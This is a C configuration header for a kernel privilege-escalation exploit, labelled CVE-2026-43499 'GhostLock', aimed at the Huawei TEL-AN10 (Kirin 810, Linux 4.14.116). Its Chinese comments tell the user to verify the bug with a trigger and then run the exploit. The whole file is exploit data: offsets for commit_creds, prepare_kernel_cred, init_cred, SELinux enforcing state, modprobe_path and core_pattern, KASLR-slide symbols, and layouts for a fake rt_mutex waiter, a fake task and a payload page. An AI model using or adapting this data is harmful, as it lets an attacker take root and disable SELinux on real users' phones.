#ifndef TARGET_H
#define TARGET_H

/* ================================================================
 * Target: HUAWEI TEL-AN10 (nova 5i Pro / Kirin 810) - denver
 * Kernel: Linux 4.14.116+ (merge_denver_defconfig, ARM64 39-bit VA)
 * Arch:   ARM64 (aarch64), 4KB pages
 *
 * CVE-2026-43499 (GhostLock) Target Configuration
 *
 * 符号偏移来源: 手机 BOOT 解包 -> vmlinux-to-elf -> System.map
 *   (repo3/System.map, 基址 ffffff8008080000 = _text)
 * 结构体偏移来源: opensource 编译产物 vmlinux 的 DWARF 调试信息
 *   (TEL-AN10_kernel_build/vmlinux, 4.14.116, merge_denver_defconfig)
 *
 * ⚠️ 手机当前运行的内核必须与 System.map 对应版本一致，
 *    先用 trigger 验证漏洞存在，再跑 exploit。
 * ================================================================ */

#define BUILD_VARIANT_LABEL "tel_an10_kirin810_4.14.116"
#define BUILD_FINGERPRINT "HUAWEI/TEL-AN10/TEL-AN10:10/HUAWEITEL-AN10/...:user/release-keys"

/* ================================================================
 * Memory Layout (ARM64 39-bit VA - 4.14 Kirin 810)
 * PAGE_OFFSET=0xffffff8000000000, KIMAGE_VADDR=0xffffff8008080000
 * ================================================================ */
#define KIMAGE_TEXT_BASE               0xffffff8008080000ULL  /* _text (System.map) */
#define P0_PAGE_OFFSET                 0xffffff8000000000ULL  /* 4.14 线性映射基址 */
#define P0_PHYS_OFFSET                 0x80000000ULL          /* Kirin DRAM 物理基址 */
#define DIRECT_MAP_BASE                0xffffff8000000000ULL
#define DIRECT_MAP_END                 0xffffffc000000000ULL
#define KERNEL_PHYS_LOAD               0x80080000ULL          /* _text 物理地址 */

/* KASLR: CONFIG_RANDOMIZE_BASE=y, memstart_offset_seed 随机化线性区
 * (512MB/1GB 粒度). 若 bootloader 未提供 kaslr-seed 则实际无偏移.
 * 运行时通过 /proc/kallsyms 或 boot_id 泄漏确定 slide. */
#define KASLR_SLIDE_GRANULARITY        (1ULL << 29)           /* ARM64_MEMSTART_ALIGN */

/* 4KB pages */
#define PAGE_SHIFT                     12
#define KS_PAGE_SIZE                   4096
#define KS_PAGE_MASK                   0xfffULL

/* ================================================================
 * Core Kernel Symbols (offsets from KIMAGE_TEXT_BASE)
 * ================================================================ */

/* Root payload functions */
#define COMMIT_CREDS_OFF               0x0006e380ULL  /* ffffff80080ee380 */
#define PREPARE_KERNEL_CRED_OFF        0x0006e6f8ULL  /* ffffff80080ee6f8 */
#define INIT_TASK_OFF                  0x023dc640ULL  /* ffffff800a45c640 */
#define INIT_CRED_OFF                  0x023ec668ULL  /* ffffff800a46c668 */

#define INIT_TASK                      (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define COMMIT_CREDS                   (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
#define PREPARE_KERNEL_CRED            (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)

/* ================================================================
 * KASLR Bypass / Slide symbols
 * ================================================================ */
#define SLIDE_INIT_NSPROXY_OFF         0x023ec4f0ULL  /* init_nsproxy   */
#define SLIDE_INIT_NET_OFF             0x0287c5c0ULL  /* init_net       */
#define SLIDE_NFULNL_LOGGER_OFF        0x023d27d0ULL  /* nfulnl_logger  */
#define SLIDE_LOGGERS_0_1_OFF          0x023d26f8ULL  /* nf_log loggers */
#define SLIDE_SYSCTL_BOOTID_OFF        0x02ae5884ULL  /* sysctl_bootid[16] */
/* 4.14 无 random_boot_id_data 符号, boot_id 数据即 sysctl_bootid */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  SLIDE_SYSCTL_BOOTID_OFF

/* ================================================================
 * Exploit Target: ConfigFS (4.14: .read/.write, 无 read_iter/write_iter)
 * ================================================================ */
#define CONFIGFS_READ_OFF              0x003158e0ULL  /* configfs_read_file   */
#define CONFIGFS_WRITE_OFF             0x00315a00ULL  /* configfs_write_file  */
#define CONFIGFS_OPEN_OFF              0x00315bb8ULL  /* configfs_open_file   */
#define CONFIGFS_RELEASE_OFF           0x00315bd0ULL  /* configfs_release     */
#define CONFIGFS_BIN_READ_OFF          0x00315c10ULL  /* configfs_read_bin_file  */
#define CONFIGFS_BIN_WRITE_OFF         0x00315d90ULL  /* configfs_write_bin_file */

/* ================================================================
 * Exploit Target: Pipe Buffer Operations
 * ================================================================ */
#define ANON_PIPE_BUF_OPS_OFF          0x018ebb00ULL  /* anon_pipe_buf_ops */
#define PIPE_READ_OFF                  0x00264320ULL  /* pipe_read  */
#define PIPE_WRITE_OFF                 0x00264628ULL  /* pipe_write */
#define GENERIC_FILE_SPLICE_READ_OFF   0x002992d8ULL  /* generic_file_splice_read */
#define COPY_SPLICE_READ_OFF           GENERIC_FILE_SPLICE_READ_OFF

/* ================================================================
 * Generic VFS
 * ================================================================ */
#define GENERIC_FILE_LLSEEK_OFF        0x00256818ULL  /* generic_file_llseek */
#define NOOP_LLSEEK_OFF                0x00256a38ULL  /* noop_llseek */
#define NO_LLSEEK_OFF                  0x00256a40ULL  /* no_llseek  */
#define GENERIC_FILE_READ_ITER_OFF     0x001c3200ULL  /* generic_file_read_iter  */
#define GENERIC_FILE_WRITE_ITER_OFF    0x001c52a8ULL  /* generic_file_write_iter */

/* ================================================================
 * Ashmem (Android-specific, 4.14: 无 ashmem_misc_fops 符号)
 * ================================================================ */
#define ASHMEM_FOPS_OFF                0x01a415a0ULL  /* ashmem_fops */
#define ASHMEM_MISC_FOPS_OFF           ASHMEM_FOPS_OFF /* 4.14 直接 misc_register(&ashmem_fops) */
#define ASHMEM_IOCTL_OFF               0x00d57f38ULL  /* ashmem_ioctl */
#define ASHMEM_MMAP_OFF                0x00d588b8ULL  /* ashmem_mmap  */

/* ================================================================
 * Slab / Allocator
 * ================================================================ */
#define KMALLOC_CACHES_OFF             0x01fd8888ULL  /* kmalloc_caches */

/* ================================================================
 * Security / SELinux
 * ================================================================ */
#define SELINUX_STATE_OFF              0x03128000ULL  /* selinux_state (手机内核有该符号) */
#define SELINUX_ENFORCING_OFF          (SELINUX_STATE_OFF + 1) /* bool enforcing, 需设备验证 */
#define SECURITY_HOOK_HEADS_OFF        0x01fd8d88ULL  /* security_hook_heads */
#define KPTR_RESTRICT_OFF              0x023dbf18ULL  /* kptr_restrict */
#define MODPROBE_PATH_OFF              0x023ecc88ULL  /* modprobe_path */
#define CORE_PATTERN_OFF               0x0241d810ULL  /* core_pattern */
#define CORE_PIPE_LIMIT_OFF            0x0293e5c8ULL  /* core_pipe_limit */

#define SELINUX_ENFORCING              (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS            (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)

/* ================================================================
 * Misc Kernel Data
 * ================================================================ */
#define EMPTY_ZERO_PAGE_OFF            0x028ee000ULL  /* empty_zero_page */
#define ROOT_TASK_GROUP_OFF            0x028f4dc0ULL  /* root_task_group */
#define INIT_UTS_NS_OFF                0x023dc3e8ULL  /* init_uts_ns */
#define MEMSTART_ADDR_OFF              0x01fd8708ULL  /* memstart_addr */
#define KIMAGE_VOFFSET_OFF             0x01fd8718ULL  /* kimage_voffset */
#define LINUX_BANNER_OFF               0x01580018ULL  /* linux_banner */
#define UEVENT_HELPER_OFF              0x031279d0ULL  /* uevent_helper */

/* ================================================================
 * Vulnerability Verification Symbols
 * ================================================================ */
#define RT_MUTEX_START_PROXY_LOCK_OFF  0x000ccb78ULL  /* rt_mutex_start_proxy_lock */
#define REMOVE_WAITER_OFF              0x000ccc08ULL  /* remove_waiter */
#define FUTEX_REQUEUE_OFF              0x00112680ULL  /* futex_requeue */

/* ================================================================
 * Payload Page Layout (for fake lock route)
 * ================================================================ */
#define LOCK_OFF                       0x1350
#define W0_OFF                         0x2220
#define FOPS_OFF                       0x1000
#define SCRATCH_OFF                    0x3000
#define RIGHT_OFF                      0x4440
#define LEFT_OFF                       0x5550
#define FAKE_TASK_OFF                  0x3200

/* ================================================================
 * rt_mutex_waiter struct offsets (4.14 DWARF 实测)
 * struct rt_mutex_waiter { rb_node tree_entry; rb_node pi_tree_entry;
 *                          task; lock; prio; deadline; } = 0x50
 * ================================================================ */
#define WAITER_TREE_ENTRY_OFF          0x00
#define WAITER_PI_TREE_ENTRY_OFF       0x18
#define WAITER_TASK_OFF                0x30
#define WAITER_LOCK_OFF                0x38
#define WAITER_PRIO_OFF                0x40
#define WAITER_DEADLINE_OFF            0x48
#define WAITER_LOCAL_OFF               0x80

/* Fake waiter in payload page / fd_set 喷射 (布局同 rt_mutex_waiter) */
#define FAKE_WAITER_TREE_ENTRY_OFF     WAITER_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF  WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF           WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF           WAITER_LOCK_OFF
#define FAKE_WAITER_PRIO_OFF           WAITER_PRIO_OFF
#define FAKE_WAITER_DEADLINE_OFF       WAITER_DEADLINE_OFF
#define FAKE_WAITER_SIZE               0x50

/* ================================================================
 * task_struct offsets (4.14.116 DWARF 实测, sizeof=0x10c0)
 * ================================================================ */
#define TASK_THREAD_INFO_OFF           0x000   /* thread_info (flags 在 thread_info) */
#define TASK_USAGE_OFF                 0x028
#define TASK_PRIO_OFF                  0x130
#define TASK_STATIC_PRIO_OFF           0x134
#define TASK_NORMAL_PRIO_OFF           0x138
#define TASK_RT_PRIORITY_OFF           0x13c
#define TASK_TASKS_OFF                 0x6b0
#define TASK_MM_OFF                    0x700
#define TASK_ACTIVE_MM_OFF             0x708
#define TASK_ATOMIC_FLAGS_OFF          0x778
#define TASK_PID_OFF                   0x7b0
#define TASK_TGID_OFF                  0x7b4
#define TASK_REAL_PARENT_OFF           0x7c0
#define TASK_PARENT_OFF                0x7c8
#define TASK_CHILDREN_OFF              0x7d0
#define TASK_SIBLING_OFF               0x7e0
#define TASK_GROUP_LEADER_OFF          0x7f0
#define TASK_THREAD_GROUP_OFF          0x860
#define TASK_REAL_CRED_OFF             0x970
#define TASK_CRED_OFF                  0x978
#define TASK_COMM_OFF                  0x980
#define TASK_SIGNAL_OFF                0x9b8
#define TASK_SIGHAND_OFF               0x9c0
#define TASK_SECCOMP_OFF               0xa28
#define TASK_PI_LOCK_OFF               0xa60
#define TASK_PI_WAITERS_OFF            0xa80
#define TASK_PI_TOP_TASK_OFF           0xa90
#define TASK_PI_BLOCKED_ON_OFF         0xa98
#define TASK_THREAD_OFF                0xd00

/* Fake task layout (偏移同 task_struct 对应字段) */
#define FAKE_TASK_USAGE_OFF            TASK_USAGE_OFF
#define FAKE_TASK_PRIO_OFF             TASK_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF      TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_PI_LOCK_OFF          TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF       TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF      TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF    TASK_PI_BLOCKED_ON_OFF

/* ================================================================
 * cred struct offsets (4.14 DWARF 实测, sizeof=0xa8)
 * ================================================================ */
#define CRED_USAGE_OFF                  0x00
#define CRED_UID_OFF                    0x04
#define CRED_GID_OFF                    0x08
#define CRED_SUID_OFF                   0x0c
#define CRED_SGID_OFF                   0x10
#define CRED_EUID_OFF                   0x14
#define CRED_EGID_OFF                   0x18
#define CRED_FSUID_OFF                  0x1c
#define CRED_FSGID_OFF                  0x20
#define CRED_SECUREBITS_OFF             0x24
#define CRED_CAP_INHERITABLE_OFF        0x28
#define CRED_CAP_PERMITTED_OFF          0x30
#define CRED_CAP_EFFECTIVE_OFF          0x38
#define CRED_CAP_BSET_OFF               0x40
#define CRED_CAP_AMBIENT_OFF            0x48
#define CRED_SECURITY_OFF               0x78   /* selinux  blob 指针 */
#define CRED_USER_OFF                   0x80
#define CRED_USER_NS_OFF                0x88

/* ================================================================
 * seccomp struct offsets (4.14 DWARF 实测, sizeof=0x10)
 * ================================================================ */
#define SECCOMP_MODE_OFF                0x00
#define SECCOMP_FILTER_OFF              0x08
#define HAVE_SECCOMP_FILTER_COUNT       0

/* ================================================================
 * file_operations struct offsets (4.14 DWARF 实测, sizeof=0xf0)
 * ================================================================ */
#define FOPS_OWNER_OFF                 0x00
#define FOPS_LLSEEK_OFF                0x08
#define FOPS_READ_OFF                  0x10
#define FOPS_WRITE_OFF                 0x18
#define FOPS_READ_ITER_OFF             0x20
#define FOPS_WRITE_ITER_OFF            0x28
#define FOPS_ITERATE_OFF               0x30
#define FOPS_ITERATE_SHARED_OFF        0x38
#define FOPS_POLL_OFF                  0x40
#define FOPS_UNLOCKED_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF          0x50
#define FOPS_MMAP_OFF                  0x58
#define FOPS_OPEN_OFF                  0x60
#define FOPS_FLUSH_OFF                 0x68
#define FOPS_RELEASE_OFF               0x70
#define FOPS_FSYNC_OFF                 0x78
#define FOPS_FASYNC_OFF                0x80
#define FOPS_LOCK_OFF                  0x88
#define FOPS_SENDPAGE_OFF              0x90
#define FOPS_GET_UNMAPPED_AREA_OFF     0x98
#define FOPS_CHECK_FLAGS_OFF           0xa0
#define FOPS_FLOCK_OFF                 0xa8
#define FOPS_SPLICE_WRITE_OFF          0xb0
#define FOPS_SPLICE_READ_OFF           0xb8
#define FOPS_SETLEASE_OFF              0xc0
#define FOPS_FALLOCATE_OFF             0xc8
#define FOPS_SHOW_FDINFO_OFF           0xd0
#define FOPS_COPY_FILE_RANGE_OFF       0xd8
#define FOPS_CLONE_FILE_RANGE_OFF      0xe0
#define FOPS_DEDUPE_FILE_RANGE_OFF     0xe8

/* 4.14 无 IOCTL 字段名, 即 unlocked_ioctl */
#define FOPS_IOCTL_OFF                 FOPS_UNLOCKED_IOCTL_OFF

/* ================================================================
 * pipe_buffer / pipe_inode_info struct offsets (4.14 DWARF 实测)
 * ================================================================ */
#define PIPE_BUFFER_SIZE               0x28
#define PIPE_BUFFER_SLOTS              16     /* 4.14: PIPE_DEF_BUFFERS=16 */
#define PIPE_BUF_FLAG_CAN_MERGE        0x10

/* 4.14 pipe_inode_info: 无 head/tail, 用 nrbufs/curbuf/buffers */
#define PIPE_MUTEX_OFF                 0x00
#define PIPE_WAIT_OFF                  0x40
#define PIPE_NRBUFS_OFF                0x68
#define PIPE_CURBUF_OFF                0x6c
#define PIPE_BUFFERS_OFF               0x70
#define PIPE_BUFS_OFF                  0xa8
#define PIPE_USER_OFF                  0xb0

/* ================================================================
 * ConfigFS item/buffer offsets (4.14 DWARF 实测, sizeof=0x90)
 * ================================================================ */
#define CFG_PAGE_OFF                   0x10
#define CFG_OPS_OFF                    0x18
#define CFG_NEEDS_READ_FILL_OFF        0x60
#define CFG_READ_IN_PROGRESS_OFF       0x64
#define CFG_WRITE_IN_PROGRESS_OFF      0x65
#define CFG_BIN_BUFFER_OFF             0x68
#define CFG_BIN_BUFFER_SIZE_OFF        0x70
#define CFG_CB_MAX_SIZE_OFF            0x74
#define CFG_ITEM_OFF                   0x78
#define CFG_OWNER_OFF                  0x80

/* ================================================================
 * struct page (4.14 DWARF 实测, sizeof=0x40)
 * ================================================================ */
#define STRUCT_PAGE_SIZE               0x40
#define STRUCT_PAGE_FLAGS_OFF          0x00
#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x10   /* union 内 compound_head (待验证) */
#define STRUCT_PAGE_MEM_CGROUP_OFF     0x38

/* ================================================================
 * mm_struct (4.14 DWARF 实测, sizeof=0x3c0)
 * ================================================================ */
#define MM_STRUCT_SZ                   0x3c0
#define MM_ORDER                       3
#define MM_MMAP_OFF                    0x00
#define MM_PGD_OFF                     0x40
#define MM_SAVED_AUXV_OFF              0x178
#define MM_EXE_FILE_OFF                0x370

/* ================================================================
 * futex (4.14)
 * ================================================================ */
#define FUTEX_Q_SIZE                    0x70   /* sizeof(futex_q) */
#define FUTEX_Q_LIST_OFF                0x00
#define FUTEX_Q_TASK_OFF                0x28
#define FUTEX_Q_LOCK_PTR_OFF            0x30
#define FUTEX_Q_KEY_OFF                 0x38
#define FUTEX_Q_PI_STATE_OFF            0x50
#define FUTEX_Q_RT_WAITER_OFF           0x58

#endif /* TARGET_H */
